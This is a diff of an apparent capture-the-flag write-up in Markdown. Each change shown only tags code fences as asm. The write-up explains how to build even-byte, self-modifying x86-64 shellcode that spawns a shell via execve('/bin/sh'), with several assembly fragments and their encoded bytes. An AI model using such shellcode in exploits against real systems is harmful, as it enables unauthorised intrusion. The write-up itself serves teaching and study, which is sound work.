@@ -114,26 +114,26 @@ Besides that, It's time to discuss what this code does, so we can make sure we r
 
 
 1. Setting the `rsi` register to 0 and pushing it to the stack
-```
+```asm
 xor esi, esi
 push rsi
 ```
 2. Moving `/bin//sh` into the `rbx` register, and pushing it to the stack
-```
+```asm
 mov rbx, 0x68732f2f6e69622f
 push rbx
 ```
 3. Move the stack address to the `rdi` register. This is the `char*` pointer to our `'/bin//sh'` string.
-```
+```asm
 push rsp
 pop rdi
 ```
 4. I didn't really know what this did at first glance, but looking at the documentation, imul stores its result into `dx:ax` register range, or `rdx` and `rax`, which, since we set `esi` to 0, this is a cheap way to set both registers to 0.
-```
+```asm
 imul esi
 ```
 5. Call `execve('/bin/sh', 0, 0)`. `0x3b` is the ID for the system call of `execve()`. The calling convention uses `rdi`, `rsi` and `rdx` in that order, which we've set to the string pointer, 0 and 0, respectively.
-```
+```asm
 mov al, 0x3b
 syscall
 ```
@@ -147,7 +147,7 @@ My plan was to avoid self-modification for as long as possible, just because my 
 To see what bytes assembled to what, I used [this online tool](https://defuse.ca/online-x86-assembler.htm#disassembly), since it's more or less designed for shellcode, and avoids dealing with labels or anything fancy to actually make a working program.
 
 To start, `xor esi esi` compiles to `[\x31]\xF6`. Reading that original paper about alphanumeric shellcode, they used a different trick to get `0` into the `esi` register. Lucky for me, that same trick just so happened to use only even bytes. So without much thought, I replaced that in my shellcode:
-```
+```asm
 push 0x30
 pop rsi
 xorb sil, 0x30
@@ -155,7 +155,7 @@ xorb sil, 0x30
 This compiles to `\x6A\x30\x5E\x40\x80\xF6\x30`. All this does is write 0x30 to the stack (could be any even byte, but this paper was trying to use alphanumeric characters only). Puts it into `rsi`, then xors the single byte with `0x30` again, setting the whole register to `0`.
 
 Next, we have this move and push command:
-```
+```asm
 mov rbx, 0x68732f2f6e69622f
 push rbx
 ```
@@ -195,7 +195,7 @@ Annoyingly, this means that we have to do this *a lot* as our odd bytes are clos
 
 So that very nice and clean `mov` and `push` command becomes this monster:
 
-```
+```asm
 mov ax, 0x0068
 push ax
 mov ax, 0x7200
@@ -240,7 +240,7 @@ A lot of getting this to work was using `gdb` with `gef` enabled. It's easier to
 There's a few more changes we can make to that original shellcode with relative ease.
 
 That `imul esi` compiles to `[\xF7]\xEE`. This is just a really elegant way to set a couple registers to 0. Luckily, we can reuse that same `xor` trick on the registers it affects (`rax` and `rdx`):
-```
+```asm
 push 0x30
 pop rax
 xorb al, 0x30
@@ -252,7 +252,7 @@ This compiles to `\x6A\x30\x58\x34\x30\x6A\x30\x5A\x80\xF2\x30`
 Are there better ways to do this? Probably but I can't be bothered. If it works, it works.
 
 Finally, `mov al, 0x3b` compiles to `\xB0[\x3B]`. This loads the ID for the `execve()` syscall into the first byte of `rax`. We can pretty simply use `0x3a` instead and increment it:
-```
+```asm
 mov al, 0x3a
 inc al
 ```
@@ -266,7 +266,7 @@ So we're back on the self modifying train. But memory is still memory. All we ne
 ## There's no such thing as free lunch <a name="Lunch"></a>
 
 So we need to write the address `0x133713370000` into a register and then access the memory inside of it. We'll do the same trick as we did for /bin/sh, and surely enough, it's not at all clean or elegant. Which again, is *fine*, we just need it to **work**:
-```
+```asm
 mov ax, 0x0000
 push ax
 mov ax, 0x1200
@@ -306,7 +306,7 @@ Which gives us the end result of having our first point of interest stored in th
 
 Now, we can increment the memory at the address, (first, the `pop rdi` instruction), move the pointer to somewhere else, and increment that memory too (the `syscall` instruction).
 
-```
+```asm
 incb [rax] ;brackets dereference the pointer
 mov al, 0x?? ;again, this is position dependent until the final result.
 incb [rax]
@@ -318,7 +318,7 @@ incb [rax]
 
 Finally, we can put it all together:
 
-```
+```asm
 push 0x30
 pop rsi
 xorb sil, 0x30
